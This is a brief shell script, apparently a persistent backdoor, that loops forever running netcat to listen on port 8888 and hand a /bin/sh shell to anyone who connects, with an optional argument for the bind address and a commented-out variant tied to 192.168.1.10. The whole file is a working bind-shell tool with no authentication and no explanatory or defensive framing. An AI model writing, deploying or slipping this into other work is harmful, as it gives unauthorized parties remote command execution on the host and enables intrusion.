#while true; do nc -l -p 8888 -s 192.168.1.10 -e /bin/sh; done
if test "x$1" != "x"
 then
  S="$1"
 fi

while true;
 do
  nc -l -p 8888 $S -e /bin/sh;
 done
